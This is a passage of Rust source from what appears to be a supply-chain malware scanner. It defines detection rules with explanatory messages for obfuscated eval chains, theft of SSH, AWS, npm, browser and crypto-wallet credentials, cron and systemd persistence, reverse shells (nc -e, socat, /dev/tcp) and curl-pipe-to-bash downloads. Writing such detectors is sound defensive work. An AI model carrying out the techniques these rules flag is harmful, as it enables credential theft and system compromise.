                _ => (&RE_EVAL, PAT_EVAL, "SB_EVAL"),
            };

            if let Some(re) = get_re(re_lock, pat) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_obfuscation = true;
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::Medium,
                                "eval() usage detected",
                                "eval() allows execution of dynamically constructed code. Frequently used by malware to hide payload from static analysis.",
                            )
                            .with_rule_id(rule_id)
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        // Function constructor (JS only)
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript)
            && let Some(re) = get_re(&RE_FUNCTION_CTOR, PAT_FUNCTION_CTOR)
        {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cmd_exec = true;
                    has_obfuscation = true;
                    findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::Medium,
                                "new Function() code execution",
                                "new Function() constructs executable code at runtime — equivalent to eval().",
                            )
                            .with_rule_id("SB_JS_FUNCTION_CTOR")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                    break;
                }
            }
        }

        // ── 3. Obfuscation signals ─────────────────────────────────────────────

        // eval(atob(...))
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript) {
            if let Some(re) = get_re(&RE_EVAL_ATOB, PAT_EVAL_ATOB) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_obfuscation = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Obfuscation,
                                Severity::High,
                                Confidence::High,
                                "eval(atob(...)) base64 decoding and execution",
                                "eval(atob(...)) decodes a base64 payload at runtime and executes it. A canonical obfuscation pattern in supply-chain malware.",
                            )
                            .with_rule_id("SB_JS_EVAL_ATOB")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            // Buffer.from(x,'base64').toString() + eval chain
            if let Some(re) = get_re(&RE_BUF_B64_EVAL, PAT_BUF_B64_EVAL)
                && re.is_match(text.as_ref())
            {
                has_obfuscation = true;
                findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::Obfuscation,
                            Severity::High,
                            Confidence::High,
                            "Buffer base64 decode+eval chain",
                            "Buffer.from(x,'base64').toString() followed by eval() is a Node.js-specific obfuscation pattern for concealing a payload.",
                        )
                        .with_rule_id("SB_JS_BUF_B64_EVAL")
                        .with_location(FileLocation::file(path))
                    );
            }

            // fromCharCode loop
            if let Some(re) = get_re(&RE_FROMCHARCODE, PAT_FROMCHARCODE) {
                let count = re.find_iter(text.as_ref()).count();
                if count >= 3 {
                    has_obfuscation = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::Obfuscation,
                            Severity::High,
                            Confidence::Medium,
                            "fromCharCode string assembly detected",
                            "String.fromCharCode() used repeatedly to construct strings at runtime, hiding content from static analysis.",
                        )
                        .with_rule_id("SB_JS_FROMCHARCODE")
                        .with_location(FileLocation::file(path))
                    );
                }
            }
        }

        // Hex string chain (universal — works in JS/Python/PHP/Shell)
        if let Some(re) = get_re(&RE_HEX_STR_CHAIN, PAT_HEX_STR_CHAIN)
            && let Some(m) = re.find(text.as_ref())
        {
            has_obfuscation = true;
            let snippet = &text[m.start()..m.end().min(m.start() + 40)];
            findings.push(
                    Finding::new(
                        ENGINE,
                        ThreatCategory::Obfuscation,
                        Severity::Medium,
                        Confidence::Medium,
                        "Dense hex escape sequence detected",
                        "Six or more consecutive \\xNN hex escapes typically indicate a manually obfuscated string or embedded shellcode.",
                    )
                    .with_rule_id("SB_HEX_STR_CHAIN")
                    .with_location(FileLocation::file(path))
                    .with_evidence(snippet, 160),
                );
        }

        // _0x identifier density (JS obfuscator output)
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript)
            && let Some(re) = get_re(&RE_0X_IDENTS, PAT_0X_IDENTS)
        {
            let count = re.find_iter(text.as_ref()).count();
            if count >= 5 {
                has_obfuscation = true;
                findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::Obfuscation,
                            Severity::High,
                            Confidence::High,
                            "JavaScript obfuscator output detected",
                            "_0x… identifiers are the canonical output of js-obfuscator and similar tools. The code has been deliberately obfuscated.",
                        )
                        .with_rule_id("SB_JS_0X_OBFUSCATOR")
                        .with_location(FileLocation::file(path))
                    );
            }
        }

        // ── 4. Credential/secret harvesting ───────────────────────────────────

        // SSH keys
        if let Some(re) = get_re(&RE_SSH_KEY, PAT_SSH_KEY) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cred_read = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::High,
                            "SSH key/config file access",
                            "The script references ~/.ssh private key or config paths. This is a strong indicator of credential theft.",
                        )
                        .with_rule_id("SB_CRED_SSH_KEY")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // AWS credentials
        if let Some(re) = get_re(&RE_AWS_CREDS, PAT_AWS_CREDS) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cred_read = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::High,
                            "AWS credentials file access",
                            "The script references ~/.aws/credentials or ~/.aws/config, which store AWS access keys.",
                        )
                        .with_rule_id("SB_CRED_AWS_CREDS")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // .npmrc (auth tokens)
        if let Some(re) = get_re(&RE_NPMRC, PAT_NPMRC) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cred_read = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::High,
                            ".npmrc file access (auth token theft)",
                            ".npmrc can contain npm registry authentication tokens. Access in a lifecycle script is a supply-chain attack pattern.",
                        )
                        .with_rule_id("SB_CRED_NPMRC")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // .env read
        if let Some(re) = get_re(&RE_DOTENV_READ, PAT_DOTENV_READ) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cred_read = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::Medium,
                            ".env file read detected",
                            "Reading .env files in a package script can harvest application secrets and API keys.",
                        )
                        .with_rule_id("SB_CRED_DOTENV_READ")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // process.env enumeration
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript)
            && let Some(re) = get_re(&RE_PROCESS_ENV_ENUM, PAT_PROCESS_ENV_ENUM)
        {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cred_read = true;
                    findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CredentialAccess,
                                Severity::High,
                                Confidence::High,
                                "process.env enumeration detected",
                                "Object.keys/values/entries(process.env) harvests ALL environment variables, likely to exfiltrate secrets.",
                            )
                            .with_rule_id("SB_JS_PROCESS_ENV_ENUM")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                    break;
                }
            }
        }

        // keytar
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript)
            && let Some(re) = get_re(&RE_KEYTAR, PAT_KEYTAR)
        {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cred_read = true;
                    findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CredentialAccess,
                                Severity::High,
                                Confidence::High,
                                "keytar OS keychain access",
                                "keytar provides access to the OS keychain (macOS Keychain, libsecret, Windows Credential Vault). Use in a package script is a credential theft indicator.",
                            )
                            .with_rule_id("SB_JS_KEYTAR")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                    break;
                }
            }
        }

        // Browser credential store paths
        if let Some(re) = get_re(&RE_BROWSER_CRED, PAT_BROWSER_CRED) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cred_read = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::High,
                            "Browser credential store path accessed",
                            "Reference to Chrome/Firefox Login Data, Cookies, or key4.db indicates browser credential theft.",
                        )
                        .with_rule_id("SB_CRED_BROWSER_STORE")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // Crypto wallet store / seed-phrase file access (partner rule — sets
        // has_cred_read so wallet-harvest + network sink reaches the exfil chain).
        if let Some(re) = get_re(&RE_CRYPTO_WALLET_STORE, PAT_CRYPTO_WALLET_STORE) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cred_read = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CryptoStealer,
                            Severity::High,
                            Confidence::High,
                            "Cryptocurrency wallet store / seed-phrase file access",
                            "The script references a local crypto wallet store (Exodus wallet, wallet.dat, Solana id.json, MetaMask extension store, Ethereum keystore) or a seed-phrase file — the harvest target of BeaverTail/W4SP-class stealers.",
                        )
                        .with_rule_id("SB_CRED_CRYPTO_WALLET")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // RubyGems publish credential access (partner rule — sets has_cred_read
        // so gem-token theft + network sink reaches the exfil chain).
        if let Some(re) = get_re(&RE_GEM_CREDENTIALS, PAT_GEM_CREDENTIALS) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_cred_read = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::High,
                            Confidence::High,
                            "RubyGems publish credential access",
                            "The script references ~/.gem/credentials or RubyGems API-key material — the RubyGems analogue of .npmrc token theft, used by cross-ecosystem worms to republish trojanized gems.",
                        )
                        .with_rule_id("SB_CRED_RUBYGEMS")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // Hardcoded secret literal
        if let Some(re) = get_re(&RE_SECRET_KEY_LITERAL, PAT_SECRET_KEY_LITERAL) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    // Evidence for a secret: redact after the = sign
                    let safe_line: String = line.chars().take(80).collect();
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CredentialAccess,
                            Severity::Medium,
                            Confidence::Medium,
                            "Hardcoded secret/token literal",
                            "Variable name suggests a secret (key/token/password/secret) assigned a literal string value — potential credential leak.",
                        )
                        .with_rule_id("SB_HARDCODED_SECRET")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(&safe_line, 80),
                    );
                    break;
                }
            }
        }

        // ── 5. Network sinks ──────────────────────────────────────────────────

        // fetch / XMLHttpRequest / axios (JS)
        if matches!(kind, FileKind::Javascript | FileKind::TypeScript) {
            if let Some(re) = get_re(&RE_FETCH_XHR, PAT_FETCH_XHR) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_network_sink = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Network,
                                Severity::Info,
                                Confidence::High,
                                "Outbound HTTP request (fetch/XHR/axios)",
                                "The script makes outbound HTTP requests. Alone this is informational; in combination with credential reads it indicates exfiltration.",
                            )
                            .with_rule_id("SB_JS_FETCH_XHR")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            // require('http') / require('https')
            if let Some(re) = get_re(&RE_HTTP_REQUEST, PAT_HTTP_REQUEST) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_network_sink = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Network,
                                Severity::Info,
                                Confidence::High,
                                "Node http/https module import",
                                "Importing the http or https module enables outbound network connections.",
                            )
                            .with_rule_id("SB_JS_HTTP_IMPORT")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            // TCP socket connect
            if let Some(re) = get_re(&RE_SOCKET_CONNECT, PAT_SOCKET_CONNECT) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_network_sink = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Network,
                                Severity::Medium,
                                Confidence::Medium,
                                "TCP socket connect detected",
                                "net.connect() or socket.connect() establishes a raw TCP connection. Used in reverse shells and C2 beacons.",
                            )
                            .with_rule_id("SB_NET_SOCKET_CONNECT")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        // Python network
        if matches!(kind, FileKind::Python) {
            if let Some(re) = get_re(&RE_PYTHON_REQUESTS, PAT_PYTHON_REQUESTS) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_network_sink = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Network,
                                Severity::Info,
                                Confidence::High,
                                "Python requests HTTP call",
                                "requests library HTTP call detected. Informational alone; suspicious combined with credential access.",
                            )
                            .with_rule_id("SB_PY_REQUESTS")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_PYTHON_URLLIB, PAT_PYTHON_URLLIB) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_network_sink = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Network,
                                Severity::Info,
                                Confidence::High,
                                "Python urllib HTTP call",
                                "urllib HTTP call detected. Informational alone; suspicious combined with credential access.",
                            )
                            .with_rule_id("SB_PY_URLLIB")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        // curl / wget in shell / JS strings
        if matches!(
            kind,
            FileKind::Shell | FileKind::Javascript | FileKind::TypeScript
        ) {
            if let Some(re) = get_re(&RE_CURL_CMD, PAT_CURL_CMD) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_network_sink = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Network,
                                Severity::Medium,
                                Confidence::High,
                                "curl HTTP command detected",
                                "curl command invocation to a remote URL detected.",
                            )
                            .with_rule_id("SB_SH_CURL_CMD")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_WGET_CMD, PAT_WGET_CMD) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_network_sink = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Network,
                                Severity::Medium,
                                Confidence::High,
                                "wget HTTP command detected",
                                "wget command invocation to a remote URL detected.",
                            )
                            .with_rule_id("SB_SH_WGET_CMD")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        // ── 6. Persistence writes ──────────────────────────────────────────────

        if let Some(re) = get_re(&RE_CRONTAB, PAT_CRONTAB) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::FilesystemAbuse,
                            Severity::Critical,
                            Confidence::High,
                            "Cron persistence write detected",
                            "The script writes to crontab or /etc/cron.d to install a persistent scheduled task — a classic malware persistence mechanism.",
                        )
                        .with_rule_id("SB_PERSIST_CRON")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        if let Some(re) = get_re(&RE_BASHRC_WRITE, PAT_BASHRC_WRITE) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::FilesystemAbuse,
                            Severity::High,
                            Confidence::Medium,
                            "Shell startup file modification",
                            "The script references ~/.bashrc, ~/.zshrc, or /etc/profile — common targets for persistence via shell startup hooks.",
                        )
                        .with_rule_id("SB_PERSIST_BASHRC")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        if let Some(re) = get_re(&RE_SYSTEMD_WRITE, PAT_SYSTEMD_WRITE) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::FilesystemAbuse,
                            Severity::Critical,
                            Confidence::High,
                            "systemd unit path write detected",
                            "Writing to /etc/systemd/system or ~/.config/systemd/user installs a persistent service — a high-confidence malware persistence technique.",
                        )
                        .with_rule_id("SB_PERSIST_SYSTEMD")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        if let Some(re) = get_re(&RE_WIN_RUNKEY, PAT_WIN_RUNKEY) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::FilesystemAbuse,
                            Severity::Critical,
                            Confidence::High,
                            "Windows Run registry key persistence",
                            "Writing to HKLM/HKCU CurrentVersion\\Run installs a program that executes on every Windows login.",
                        )
                        .with_rule_id("SB_PERSIST_WIN_RUNKEY")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        // ── 7. Reverse shells ──────────────────────────────────────────────────

        if let Some(re) = get_re(&RE_REVSHELL_BASH, PAT_REVSHELL_BASH) {
            for (lineno, line) in &lines {
                if re.is_match(line) {
                    has_network_sink = true;
                    findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CommandExecution,
                            Severity::Critical,
                            Confidence::High,
                            "Bash reverse shell pattern",
                            "/dev/tcp redirect or bash -i >& /dev/tcp is a textbook reverse shell. Near-certain indicator of active malware.",
                        )
                        .with_rule_id("SB_REVSHELL_BASH")
                        .with_location(FileLocation::at_line(path, *lineno))
                        .with_evidence(line.as_str(), 160),
                    );
                    break;
                }
            }
        }

        if matches!(kind, FileKind::Python)
            && let Some(re) = get_re(&RE_REVSHELL_PYTHON, PAT_REVSHELL_PYTHON)
            && re.is_match(text.as_ref())
        {
            has_network_sink = true;
            findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CommandExecution,
                            Severity::Critical,
                            Confidence::High,
                            "Python reverse shell socket pattern",
                            "socket import combined with AF_INET connect() matches the standard Python reverse-shell boilerplate.",
                        )
                        .with_rule_id("SB_REVSHELL_PYTHON")
                        .with_location(FileLocation::file(path))
                    );
        }

        if matches!(kind, FileKind::Shell | FileKind::Text) {
            if let Some(re) = get_re(&RE_REVSHELL_PERL, PAT_REVSHELL_PERL) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_network_sink = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::Critical,
                                Confidence::High,
                                "Perl reverse shell pattern",
                                "IO::Socket::INET usage with connect() matches Perl one-liner reverse shell boilerplate.",
                            )
                            .with_rule_id("SB_REVSHELL_PERL")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_NC_E, PAT_NC_E) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_network_sink = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::Critical,
                                Confidence::High,
                                "nc -e reverse shell",
                                "nc -e /bin/sh spawns an interactive shell connected to a remote host.",
                            )
                            .with_rule_id("SB_REVSHELL_NC_E")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_SOCAT_EXEC, PAT_SOCAT_EXEC) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_network_sink = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::Critical,
                                Confidence::High,
                                "socat EXEC reverse shell",
                                "socat with EXEC: parameter spawns a process and bridges its stdio to a socket.",
                            )
                            .with_rule_id("SB_REVSHELL_SOCAT")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        // ── 8. Download-and-execute ────────────────────────────────────────────

        if matches!(kind, FileKind::Shell) {
            if let Some(re) = get_re(&RE_CURL_BASH, PAT_CURL_BASH) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_download = true;
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::Critical,
                                Confidence::High,
                                "curl | bash download-and-execute",
                                "Piping curl output directly into bash executes remote code without verification — one of the most dangerous patterns in scripts.",
                            )
                            .with_rule_id("SB_DL_EXEC_CURL_BASH")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_WGET_BASH, PAT_WGET_BASH) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_download = true;
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::Critical,
                                Confidence::High,
                                "wget | bash download-and-execute",
                                "Piping wget output directly into bash executes remote code without verification.",
                            )
                            .with_rule_id("SB_DL_EXEC_WGET_BASH")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        if matches!(kind, FileKind::Javascript | FileKind::TypeScript)
            && let Some(re) = get_re(&RE_DOWNLOAD_EXEC_JS, PAT_DOWNLOAD_EXEC_JS)
            && re.is_match(text.as_ref())
        {
            has_download = true;
            has_cmd_exec = true;
            findings.push(
                        Finding::new(
                            ENGINE,
                            ThreatCategory::CommandExecution,
                            Severity::Critical,
                            Confidence::High,
                            "Download-and-eval pattern in JavaScript",
                            "fetch/http.get followed by eval() or exec() executes remotely-fetched content — a stager pattern.",
                        )
                        .with_rule_id("SB_JS_DL_EXEC")
                        .with_location(FileLocation::file(path))
                    );
        }

        if matches!(kind, FileKind::PowerShell) {
            if let Some(re) = get_re(&RE_POWERSHELL_IEX, PAT_POWERSHELL_IEX) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_download = true;
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::Critical,
                                Confidence::High,
                                "PowerShell IEX download-and-execute",
                                "Invoke-Expression with WebClient or Invoke-WebRequest executes a remotely fetched script.",
                            )
                            .with_rule_id("SB_PS_IEX_DOWNLOAD")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_PS_ENCODED_CMD, PAT_PS_ENCODED_CMD) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_obfuscation = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Obfuscation,
                                Severity::High,
                                Confidence::High,
                                "PowerShell encoded command",
                                "-EncodedCommand / -enc hides a base64-encoded payload from command-line logging and static inspection.",
                            )
                            .with_rule_id("SB_PS_ENCODED_CMD")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_PS_BYPASS, PAT_PS_BYPASS) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::High,
                                "PowerShell execution policy bypass",
                                "-ExecutionPolicy Bypass disables script restrictions — almost always malicious in non-administrative scripts.",
                            )
                            .with_rule_id("SB_PS_EXEC_BYPASS")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_PS_DOWNLOAD_STRING, PAT_PS_DOWNLOAD_STRING) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_network_sink = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Network,
                                Severity::High,
                                Confidence::High,
                                "PowerShell remote download detected",
                                "DownloadString/DownloadFile or Invoke-WebRequest fetches remote content.",
                            )
                            .with_rule_id("SB_PS_DOWNLOAD")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        if matches!(kind, FileKind::Python) {
            // exec(requests.get(...).text)
            if let Some(re) = get_re(&RE_PYTHON_EXEC_DOWNLOAD, PAT_PYTHON_EXEC_DOWNLOAD)
                && re.is_match(text.as_ref())
            {
                has_download = true;
                has_cmd_exec = true;
                findings.push(
                    Finding::new(
                        ENGINE,
                        ThreatCategory::CommandExecution,
                        Severity::Critical,
                        Confidence::High,
                        "Python exec(download) pattern",
                        "exec() applied to HTTP response body executes remotely fetched code.",
                    )
                    .with_rule_id("SB_PY_EXEC_DOWNLOAD")
                    .with_location(FileLocation::file(path)),
                );
            }

            // os.system
            if let Some(re) = get_re(&RE_PY_OS_SYSTEM, PAT_PY_OS_SYSTEM) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::High,
                                "os.system() call detected",
                                "os.system() executes a shell command. In a package install script this enables arbitrary code execution.",
                            )
                            .with_rule_id("SB_PY_OS_SYSTEM")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            // subprocess
            if let Some(re) = get_re(&RE_PY_SUBPROCESS, PAT_PY_SUBPROCESS) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::High,
                                "subprocess execution call detected",
                                "subprocess.Popen/run/call starts an external process from Python. A canonical supply-chain attack vector.",
                            )
                            .with_rule_id("SB_PY_SUBPROCESS")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            // exec()
            if let Some(re) = get_re(&RE_PY_EXEC, PAT_PY_EXEC) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        has_obfuscation = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::Medium,
                                "exec() usage detected",
                                "Python exec() executes a string as code. Used by malware to run dynamically assembled payloads.",
                            )
                            .with_rule_id("SB_PY_EXEC")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        // ── 9. Shell-specific ──────────────────────────────────────────────────

        if matches!(kind, FileKind::Shell) {
            if let Some(re) = get_re(&RE_SH_EVAL, PAT_SH_EVAL) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::Medium,
                                "Shell eval usage detected",
                                "eval in shell scripts executes a dynamically constructed string as a command.",
                            )
                            .with_rule_id("SB_SH_EVAL")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }

            if let Some(re) = get_re(&RE_SH_BASE64_PIPE, PAT_SH_BASE64_PIPE) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_obfuscation = true;
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::Obfuscation,
                                Severity::Critical,
                                Confidence::High,
                                "base64 decode piped to shell",
                                "Decoding a base64 blob and piping it to sh/bash executes a hidden payload. Classic dropper technique.",
                            )
                            .with_rule_id("SB_SH_BASE64_PIPE_EXEC")
                            .with_location(FileLocation::at_line(path, *lineno))
                            .with_evidence(line.as_str(), 160),
                        );
                        break;
                    }
                }
            }
        }

        // ── 10. Ruby ───────────────────────────────────────────────────────────

        if matches!(kind, FileKind::Ruby) {
            if let Some(re) = get_re(&RE_RUBY_SYSTEM, PAT_RUBY_SYSTEM) {
                for (lineno, line) in &lines {
                    if re.is_match(line) {
                        has_cmd_exec = true;
                        findings.push(
                            Finding::new(
                                ENGINE,
                                ThreatCategory::CommandExecution,
                                Severity::High,
                                Confidence::High,
                                "Ruby command execution detected",
                                "system()/exec()/spawn()/IO.popen() in a gem install hook can execute arbitrary shell commands.",
                            )
                            .with_rule_id("SB_RB_SYSTEM")
                            .with_location(FileLocation::at_line(path, *lineno))
